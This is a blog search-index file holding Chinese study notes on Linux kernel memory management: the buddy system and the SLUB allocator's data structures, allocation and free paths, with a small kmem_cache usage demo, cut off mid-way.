<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>kernel学习笔记5</title>
      <link href="/posts/63384/"/>
      <url>/posts/63384/</url>
      
        <content type="html"><![CDATA[<h1 id="RWCTF2023-体验赛-Digging-into-kernel-3"><a href="#RWCTF2023-体验赛-Digging-into-kernel-3" class="headerlink" title="RWCTF2023 体验赛 - Digging into kernel 3"></a>RWCTF2023 体验赛 - Digging into kernel 3</h1>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel学习笔记4</title>
      <link href="/posts/14169/"/>
      <url>/posts/14169/</url>
      
        <content type="html"><![CDATA[<h1 id="内核堆基础"><a href="#内核堆基础" class="headerlink" title="内核堆基础"></a>内核堆基础</h1><p>类似于用户态进程中的堆(heap)，内核也有着自己的一套动态内存管理机制，为了方便这里我们同样将内核中动态分配的内存称为 “堆”。</p><p>Linux kernel 将内存分为 <code>页→区→节点</code> 三级结构，主要有两个内存管理器—— <code>buddy system</code> 与 <code>slab allocator</code>，前者负责<u>以内存页为粒度</u>管理所有可用的物理内存，后者则向前者请求内存页并划分为多个较小的对象(object)以进行细粒度的内存管理。</p><h2 id="页→区→节点三级结构"><a href="#页→区→节点三级结构" class="headerlink" title="页→区→节点三级结构"></a>页→区→节点三级结构</h2><p>这是一张十分经典的 Overview ，自顶向下是</p><ul><li><strong>节点</strong>（node，对应结构体 pgdata_list）</li><li><strong>区</strong>（zone，对应结构体 zone，图上展示了三种类型的 zone）</li><li><strong>页</strong>（page，对应结构体 page）</li></ul><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/page-zone-node.png" alt=""></p><h3 id="页-page"><a href="#页-page" class="headerlink" title="页(page)"></a>页(page)</h3><p>Linux kernel 中使用 <code>page</code> 结构体来表示一个物理页框，<strong>每个物理页框都有着一个对应的 page 结构体</strong>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/page_struct.png" alt="image.png"></p><h3 id="区-zone"><a href="#区-zone" class="headerlink" title="区(zone)"></a>区(zone)</h3><p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的 <code>区（zone）</code>，对应结构体 <code>struct zone</code>：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/zone_struct.png" alt="image.png"></p><h3 id="节点-node"><a href="#节点-node" class="headerlink" title="节点(node)"></a>节点(node)</h3><p>zone 再向上一层便是<strong>节点</strong>——Linux 将内存控制器(memory controller)作为节点划分的依据，对于 UMA 架构而言只有一个节点，而对于 NUMA 架构而言通常有多个节点，对于同一个内存控制器下的 CPU 而言其对应的节点称之为本地内存，不同处理器之间通过总线进行进一步的连接。如下图所示，一个 MC 对应一个节点：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/node_numa.png" alt="image.png"></p><h2 id="buddy-system"><a href="#buddy-system" class="headerlink" title="buddy system"></a>buddy system</h2><p>buddy system 是 Linux kernel 中的一个较为底层的内存管理系统，<strong>以内存页为粒度管理所有的物理内存</strong>，其存在于 <strong>区</strong> 这一级别，对当前区所对应拥有的所有物理页框进行管理.</p><p>在每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11.</p><p>在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：</p><script type="math/tex; mode=display">2^{order}</script><p>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张 <em>Overview</em> ：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/zone_struct.png" alt="image.png"></p><ul><li>分配：<ul><li>首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页。</li><li>若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程。</li></ul></li><li>释放：<ul><li>将对应的连续内存页释放到对应的链表上。</li><li>检索是否有可以合并的内存页，若有，则进行合成，放入更高 order 的链表中。</li></ul></li></ul><h2 id="slab-allocator"><a href="#slab-allocator" class="headerlink" title="slab allocator"></a>slab allocator</h2><p>slab allocator 则是更为细粒度的内存管理器，其通过向 buddy system 请求单张或多张连续内存页后再分割成同等大小的<strong>对象</strong>(object)返还给上层调用者来实现更为细粒度的内存管理。</p><p>slab allocator 一共有三种版本：</p><ul><li>slab(最初的版本，机制比较复杂，效率不高)</li><li>slob(用于<u>嵌入式</u>等场景的极为简化版本)</li><li>slub(优化后的版本，<strong>现在的通用版本</strong>)</li></ul><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p><code>slub</code> 版本的 allocator 为现在绝大多数 Linux kernel 所装配的版本，因此本篇文章主要叙述的也是 slub allocator，其基本结构如下图所示：</p><p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/heap/figure/slub_allocator.png" alt="image.png"></p><p>我们将 slub allocator 每次向 buddy system 请求得来的单张 / 多张内存页称之为一个 <code>slub</code>，其被分割为多个<u>同等大小</u>对象（object），每个 object 作为一个被分配实体，在 slub 的第一张内存页对应的 page 结构体上的 freelist 成员指向该张内存页上的<u>第一个空闲对象</u>，一个 slub 上的<u>所有空闲对象组成一个以 NULL 结尾的单向链表。</u></p><blockquote><p>一个 object 可以理解为用户态 glibc 中的 chunk，不过 object 并不像 chunk 那样需要有一个 header，因为 page 结构体与物理内存间存在线性对应关系，我们可以直接通过 object 地址找到其对应的 page 结构体。</p></blockquote><p><code>kmem_cache</code> 为一个基本的 allocator 组件，其用于分配某个特定大小（某种特定用途）的对象，所有的 kmem_cache 构成一个双向链表，并存在两个对应的结构体数组 <code>kmalloc_caches</code> 与 <code>kmalloc_dma_caches</code>。</p><p>一个 <code>kmem_cache</code> 主要由两个模块组成：</p><ul><li><code>kmem_cache_cpu</code>：这是一个 <strong>percpu 变量</strong>（即每个核心上都独立保留有一个副本，原理是以 gs 寄存器作为 percpu 段的基址进行寻址），用以表示当前核心正在使用的 slub，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时<strong>不需要加锁</strong>，从而极大地提高了性能</li><li><code>kmem_cache_node</code>：可以理解为当前<code>kmem_cache</code>的 slub 集散中心，其中存放着两个 slub 链表：<ul><li>partial：该 slub 上存在着一定数量的空闲 object，但并非全部空闲。</li><li>full：该 slub 上的所有 object 都被分配出去了。</li></ul></li></ul><h3 id="分配-释放过程"><a href="#分配-释放过程" class="headerlink" title="分配 / 释放过程"></a>分配 / 释放过程</h3><p>那么现在我们可以来说明 slub allocator 的分配 / 释放行为了：</p><ul><li>分配：<ul><li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回。</li><li>若 <code>kmem_cache_cpu</code> 上的 slub 已经无空闲对象了，对应 slub 会被从 <code>kmem_cache_cpu</code> 上取下，并尝试从 <strong>partial</strong> 链表上取一个 slub 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回。</li><li>若 <code>kmem_cache_node</code> 的 partial 链表也空了，那就<strong>向 buddy system 请求分配新的内存页</strong>，划分为多个 object 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用。</li></ul></li><li>释放：<ul><li>若被释放 object 属于 <code>kmem_cache_cpu</code> 的 slub，直接使用头插法插入当前 CPU slub 的 freelist。</li><li>若被释放 object 属于 <code>kmem_cache_node</code> 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist。</li><li>若被释放 object 为 full slub，则其会成为对应 slub 的 freelist 头节点，<strong>且该 slub 会被放置到 partial 链表</strong>。</li></ul></li></ul><p>以上便是 slub allocator 的基本原理。</p><h1 id="slub分配器"><a href="#slub分配器" class="headerlink" title="slub分配器"></a>slub分配器</h1><p>wiki对于slub分配器地介绍十分简洁,但实际上还是有很多东西的,深入了解一下</p><p>与用户态ptmalloc分配器诸多glibc变化较小不同</p><p>随着内核版本的变动,slub分配器的源码变动也十分显著,所以对于新版本可能还是要经常查阅源码</p><p>这段内容是基于linux-4.15.0-rc3</p><p>参考博客:</p><p><a href="http://www.wowotech.net/memory_management/426.html">图解slub (wowotech.net)</a></p><p><a href="https://zhuanlan.zhihu.com/p/490588193">深入理解Linux内存管理（八）slab，slob和slub介绍 - 知乎 (zhihu.com)</a></p><h2 id="slab与slub"><a href="#slab与slub" class="headerlink" title="slab与slub"></a>slab与slub</h2><p>slab的出现旨在解决以下两个问题：</p><ol><li>内存利用率低。正如前面提到的，如果只需要分配几个字节，如果只使用伙伴系统，则至少要分配一个页面，浪费率达到99.9%；</li><li>内存分配效率低和访问时间长。使用伙伴系统，需要走的分配路径很长，遇到内存不足时，还会进行内存压缩或回收。再者，伙伴系统每次至少分配一个页框，访问内存时，容易出现cache miss的情况。使用slab分配的小内存，即使被释放了，还很有可能在cache中，这时候再分配给其他任务使用，效率有较大提升。</li></ol><p>因此可以认为slab就是建立在伙伴系统上的一个中间层</p><hr><p>slub是slab的增强版，它的出现是为了解决slab存在的一些问题。slab有三个弊端：</p><ol><li>每个node节点有三个链表，分别记录空闲slab、部分空闲slab和非空闲slab。当回收操作来不及时，三个链表记录的页框会较长时间停留到slab管理器中，不利于提高内存的使用率。针对这点，slub只保留了一个链表，就是部分空闲slub。</li><li>每个cpu私有数据记录的是object的地址，这些object可能来自不同的slab，那么不利于slab的回收。slub改成记录一个实际可用的slub，不会影响其他slub的回收。</li><li>shared共享链表可能导致一个slab持有较多slab，无法即使释放给伙伴系统。slub去掉了该链表。</li></ol><p>可见，slub出现的主要目的是为了减少slab的数量，提高内存的使用率。同时，出于对内存使用率的极致追求，slub去除了slab的着色做法，取而代之是slub复用，通过slub复用减轻cache冲突的情况。</p><p>一个模型图如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/20220617194314.png" alt=""></p><h2 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h2><h3 id="kmem-cache"><a href="#kmem-cache" class="headerlink" title="kmem_cache"></a>kmem_cache</h3><p><strong>每一个kmem_cache结构体就是一个slub分配器的数据结构核心</strong>,因此可以大致认为一个kmem_cache就是一个slub分配器的实例</p><p>slub在向buddy system申请来若干页内存后,(该内存由slub管理器自由划分,被称为一个<code>slab</code>),将内存划分为若干个<code>object</code>，为此我们需要知道该<code>object</code>的大小,剩余数量等等信息,kmem_cache就是用于记录这些信息的管理结构体。<br>其定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> * <span class="title">cpu_slab</span>;</span><span class="comment">//percpu变量表示该变量始终位于cpu本地内存缓冲池中（分配内存时优先分配在cou内存缓冲池中以保证命中率）</span></span><br><span class="line">    <span class="type">slab_flags_t</span> flags;<span class="comment">//分配掩码，例如经常使用的SLAB_HWCACHE_ALIGN标志</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> min_partial;<span class="comment">//限制 kmem_cache_node中的partial链表的slab最大数量</span></span><br><span class="line">    <span class="type">int</span> size;<span class="comment">//分配的object大小，用户填写的</span></span><br><span class="line">    <span class="type">int</span> object_size;<span class="comment">//实际的object大小，size+对齐+各种元数据（用于管理object）</span></span><br><span class="line">    <span class="type">int</span> offset;<span class="comment">//下一个object相对于当前object的偏移</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="type">int</span> cpu_partial;<span class="comment">//限制 kmem_cache_cpu中的partial链表的所有slab的free object的最大值</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span><span class="comment">//低16位表示一个slab中的所有object数量，高16位表示page数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_ojbects</span> <span class="title">max</span>;</span><span class="comment">//等于oo</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_ojbects</span> <span class="title">min</span>;</span><span class="comment">//按照oo分配内存时出现内存不足后使用该定义分配</span></span><br><span class="line">    <span class="type">gfp_t</span> allocflags;<span class="comment">//从buddy system 分配内存的掩码</span></span><br><span class="line">    <span class="type">int</span> refcount;</span><br><span class="line">    <span class="type">void</span> (*ctor) (<span class="type">void</span> *);</span><br><span class="line">    <span class="type">int</span> inuse;<span class="comment">//object size对齐后的大小</span></span><br><span class="line">    <span class="type">int</span> align;<span class="comment">//字节对齐大小</span></span><br><span class="line">    <span class="type">int</span> reserved;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> * name;<span class="comment">//sysfs文件系统显示时使用</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">//系统有一个slab_caches链表全局变量，所有的slab都会挂入此链表。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> * <span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span><span class="comment">//slab节点NUMA系统中每个内存控制器都有一个节点</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="kmem-cache-cpu"><a href="#kmem-cache-cpu" class="headerlink" title="kmem_cache_cpu"></a>kmem_cache_cpu</h3><p>kmem_cache_cpu是对于cpu本地内存缓冲池的描述，每个cpu对应一个结构体<br>其定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> ** freelist;<span class="comment">//空闲object的链表</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">//神奇的标志，用于cpu的同步</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span><span class="comment">//当前cpu使用的slab</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span><span class="comment">//本地 slab partial链表，部分使用object的slab组成</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="kmem-cache-node"><a href="#kmem-cache-node" class="headerlink" title="kmem_cache_node"></a>kmem_cache_node</h3><p>kmem_cache_node用以描述一个 slab节点,由同一内存控制器下的所有cpu共享<br>其定于如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">    <span class="type">spinlock_t</span> list_lock;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_partial;<span class="comment">///当前 node中的partial链表中的slab数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span><span class="comment">//slab节点的 slab partial链表</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="slub接口"><a href="#slub接口" class="headerlink" title="slub接口"></a>slub接口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> kmem_cache *<span class="title function_">kmem_cache_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params">        <span class="type">size_t</span> size,</span></span><br><span class="line"><span class="params">        <span class="type">size_t</span> align,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> (*ctor)(<span class="type">void</span> *))</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kmem_cache_destroy</span><span class="params">(<span class="keyword">struct</span> kmem_cache *)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">kmem_cache_alloc</span><span class="params">(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">int</span> flags)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">kmem_cache_free</span><span class="params">(<span class="keyword">struct</span> kmem_cache *cachep, <span class="type">void</span> *objp)</span>;</span><br></pre></td></tr></table></figure><p>1) kmem_cache_create是创建kmem_cache数据结构，参数描述如下：</p><p>  name：kmem_cache的名称</p><p>  size ：slab管理对象的大小</p><p>  align：slab分配器分配内存的对齐字节数(以align字节对齐)</p><p>  flags：分配内存掩码</p><p>  ctor ：分配对象的构造回调函数</p><p>2) kmem_cache_destroy作用和kmem_cache_create相反，就是销毁创建的kmem_cache。<br>3) kmem_cache_alloc是从cachep参数指定的kmem_cache管理的内存缓存池中分配一个对象，其中flags是分配掩码，GFP_KERNEL是不是很熟悉的掩码？<br>4) kmem_cache_free是kmem_cache_alloc的反操作</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>slab分配器提供的接口该如何使用呢？其实很简单，总结分成以下几个步骤：</p><p>1) kmem_cache_create创建一个kmem_cache数据结构。<br>2) 使用kmem_cache_alloc接口分配内存，kmem_cache_free接口释放内存。<br>3) release第一步创建的kmem_cache数据结构。</p><p>再来一段demo示例代码就更好了。 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *　This is a demo for how to use kmem_cache_create</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slab_demo</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">kmem_cache</span> *kmem_cache_16 = <span class="built_in">kmem_cache_create</span>(<span class="string">&quot;kmem_cache_16&quot;</span>, <span class="number">16</span>,</span><br><span class="line">            <span class="number">8</span>, ARCH_KMALLOC_FLAGS,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* now you can alloc memory, the buf points to 16 bytes of memory*/</span></span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">kmeme_cache_alloc</span>(kmem_cache_16, GFP_KERNEL);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * do something what you what, don&#x27;t forget to release the memory after use</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="built_in">kmem_cache_free</span>(kmem_cache_16, buf);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">kmem_cache_destroy</span>(kmem_cache_16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1) 首先使用kmem_cache_create创建名称为kmem_cache_16的kmem_cache，该kmem_cache主要是描述如何管理一堆对象，其实就是slab的布局。每个对象都是16字节，并且分配的对象地址按照8字节对齐，也就是说从kmem_cache_16中分配的对象大小全是16字节。不管你要申请多少，反正就是16Bytes。当然，kmem_cache_create仅仅是创建了一个描述slab缓存池布局的数据结构，并没有从伙伴系统申请内存，具体的申请内存操作是在kmeme_cache_alloc中完成的。<br>2) kmeme_cache_alloc从kmem_cache_16分配一个对象。<br>3) 内存使用结束记得kmem_cache_free释放。<br>4) 如果不需要这个kmem_cache的话，就可以调用kmem_cache_destroy进行销毁吧。<u>在释放kmem_cache之前要保证从该kmem_cache中分配的对象全部释放了，否则无法释放kmem_cache。</u> </p><h2 id="slub数据结构之间关系"><a href="#slub数据结构之间关系" class="headerlink" title="slub数据结构之间关系"></a>slub数据结构之间关系</h2><p>使用struct kmem_cache结构描述的一段内存就称作一个slab缓存池。</p><p>一个形象的例子是:一个slab缓存池就像是一箱牛奶，一箱牛奶中有很多瓶牛奶，每瓶牛奶就是一个object。分配内存的时候，就相当于从牛奶箱中拿一瓶。总有拿完的一天。当箱子空的时候，你就需要去超市再买一箱回来。超市就相当于partial链表，超市存储着很多箱牛奶。如果超市也卖完了，自然就要从厂家进货，然后出售给你。厂家就相当于伙伴系统。</p><p><img src="https://www-x-wowotech-x-net.img.abc188.com/content/uploadfile/201803/4a471520078976.png" alt=""></p><h3 id="slub管理object方法"><a href="#slub管理object方法" class="headerlink" title="slub管理object方法"></a>slub管理object方法</h3><p>在图片的左上角就是一个slub缓存池中object的分布以及数据结构和kmem_cache之间的关系。</p><p>首先一个slab缓存池包含的页数是由oo决定的。oo拆分为两部分，低16位代表一个slab缓存池中object的数量，高16位代表包含的页数。</p><p>使用kmem_cache_create()接口创建kmem_cache的时候需要指出obj的size和对齐align。也就是传入的参数。kmem_cache_create()主要是就是填充kmem_cache结构体成员。</p><p>既然从伙伴系统得到(2^(oo &gt;&gt; 16)) pages大小内存，按照size大小进行平分。一般来说都不会整除，因此剩下的就是图中灰色所示。</p><p>由于<u>每一个object的大小至少8字节</u>，当然可以用来存储下一个object的首地址。就像图中所示的，形成单链表。图中所示下<u>个obj地址存放的位置位于每个obj首地址处</u>，在内核中称作指针内置式。同时，下个obj地址存放的位置和obj首地址之间的偏移存储在kmem_cache的offset成员。</p><p>另外一种方式是指针外置式，即下个obj的首地址存储的位置位于obj尾部，也就是在obj尾部再分配sizeof(void *)字节大小的内存。对于外置式则offset就等于kmem_cache的inuse成员。</p><h3 id="per-cpu-freelist"><a href="#per-cpu-freelist" class="headerlink" title="per cpu freelist"></a>per cpu freelist</h3><p>针对每一个cpu都会分配一个struct kmem_cacche_cpu的结构体。可以称作是本地缓存池。当内存申请的时候，优先从本地cpu缓存池申请。在分配初期，本地缓存池为空，自然要从伙伴系统分配一定页数的内存。</p><p>内核会为每一个物理页帧创建一个struct page的结构体。kmem_cacche_cpu中page就会指向正在使用的slab的页帧。freelist成员指向第一个可用内存obj首地址。</p><p>处于正在使用的slab的struct page结构体中的freelist会置成NULL，因为没有其他地方使用。struct page结构体中inuse代表已经使用的obj数量。这地方有个很有意思的地方，在刚从伙伴系统分配的slab的 inuse在分配初期就置成obj的总数，在分配obj的时候并不会改变。你是不是觉得很奇怪，既然表示已经使用obj的数量，为什么一直是obj的总数呢？你想想，slab中的对象总有分配完的时候，那个时候就直接脱离kmem_cache_cpu了。此时的inuse不就名副其实了嘛！对于full slab就像图的右下角，就像无人看管的孩子，没有任何链表来管理。</p><h3 id="per-cpu-partial"><a href="#per-cpu-partial" class="headerlink" title="per cpu partial"></a>per cpu partial</h3><p>当图中右下角full slab释放obj的时候，首先就会将slab挂入per cpu partial链表管理。通过struct page中next成员形成单链表。</p><p>per cpu partial链表指向的第一个slab的page结构中会存放一些特殊的数据。例如：pobjects存储着per cpu partial链表中所有slab可供分配obj的总数，如图所示。</p><p>当然还有一个图中没有体现的pages成员存储per cpu partial链表中所有slab缓存池的个数。</p><p>pobjects到底有什么用呢？我们从full slab中释放一个obj就添加到per cpu partial链表，总不能无限制的添加吧！因此，每次添加的时候都会判断当前的pobjects是否大于kmem_cache的cpu_partial成员，如果大于，那么就会将此时per cpu partial链表中所有的slab移送到kmem_cache_node的partial链表，然后再将刚刚释放obj的slab插入到per cpu partial链表。如果不大于，则更新pobjects和pages成员，并将slab插入到per cpu partial链表。</p><h3 id="per-node-partial"><a href="#per-node-partial" class="headerlink" title="per node partial"></a>per node partial</h3><p>per node partia链表类似per cpu partial，区别是<u>node中的slab是所有cpu共享的</u>，而<u>per cpu是每个cpu独占的</u>。假如现在的slab布局如上图所示。假如现在如红色箭头指向的obj将会释放，那么就是一个empty slab，此时判断kmem_cache_node的nr_partial是否大于kmem_cache的min_partial，如果大于则会释放该slab的内存。 </p><h2 id="slub分配内存原理"><a href="#slub分配内存原理" class="headerlink" title="slub分配内存原理"></a>slub分配内存原理</h2><p>当调用kmem_cache_alloc()分配内存的时候，我们可以从正在使用slab分配，也可以从per cpu partial分配，同样还可以从per node partial分配，那么分配的顺序是什么呢？我们可以用下图表示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/fb5c1519305301.png" alt=""></p><p>首先从cpu 本地缓存池分配，如果freelist不存在，就会转向per cpu partial分配，如果per cpu partial也没有可用对象，继续查看per node partial，如果很不幸也不没有可用对象的话，就只能从伙伴系统分配一个slab了，并挂入per cpu freelist。我们详细看一下这几种情况。</p><p>kmem_cache刚刚建立，还没有任何对象可供分配，此时只能从伙伴系统分配一个slab，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/10fb1519305301.png" alt=""></p><p>如果正在使用的slab有free obj，那么就直接分配即可，这种是最简单快捷的。如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/09dd1519305302.png" alt=""></p><p> 随着正在使用的slab中obj的一个个分配出去，最终会无obj可分配，此时per cpu partial链表中有可用slab用于分配，那么就会从per cpu partial链表中取下一个slab用于分配obj。如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/82661519305303.png" alt=""></p><p>随着正在使用的slab中obj的一个个分配出去，最终会无obj可分配，此时per cpu partial链表也为空，此时发现per node partial链表中有可用slab用于分配，那么就会从per node partial链表中取下一个slab用于分配obj。如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/f19c1519305304.png" alt=""></p><h2 id="slub释放内存原理"><a href="#slub释放内存原理" class="headerlink" title="slub释放内存原理"></a>slub释放内存原理</h2><p>我们可以通过kmem_cache_free()接口释放申请的obj对象。释放对象的流程如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/9eb91519305304.png" alt=""></p><p>如果释放的obj就是属于正在使用cpu上的slab，那么直接释放即可，非常简单；如果不是的话，首先判断所属slub是不是full状态，因为full slab是没妈的孩子，释放之后就变成partial empty，急需要找个链表领养啊！这个妈就是per cpu partial链表。如果per cpu partial链表管理的所有slab的free object数量超过kmem_cache的cpu_partial成员的话，就需要将per cpu partial链表管理的所有slab移动到per node partial链表管理；如果不是full slab的话，<u>继续判断释放当前obj后的slab是否是empty slab，如果是empty slab，那么在满足kmem_cache_node的nr_partial大于kmem_cache的min_partial的情况下，则会释放该slab的内存</u>。其他情况就直接释放即可。</p><p> 假设下图左边的情况下释放obj，如果满足kmem_cache_node的nr_partial大于kmem_cache的min_partial的话，释放情况如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/602e1519305305.png" alt=""></p><p> 假设下图左边的情况下释放obj，如果不满足kmem_cache_node的nr_partial大于kmem_cache的min_partial的话，释放情况如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/7afb1519305306.png" alt=""></p><p>假设下图从full slab释放obj的话，如果满足per cpu partial管理的所有slab的free object数量大于kmem_cache的cpu_partial成员的话的话，将per cpu partial链表管理的所有slab移动到per node partial链表管理,并将恢复的slab插入cpu partial，释放情况如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/586e1519305307.png" alt=""></p><p> 假设下图从full slab释放obj的话，如果不满足per cpu partial管理的所有slab的free object数量大于kmem_cache的cpu_partial成员的话的话，释放情况如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/59b21519305308.png" alt=""></p><h2 id="kmalloc"><a href="#kmalloc" class="headerlink" 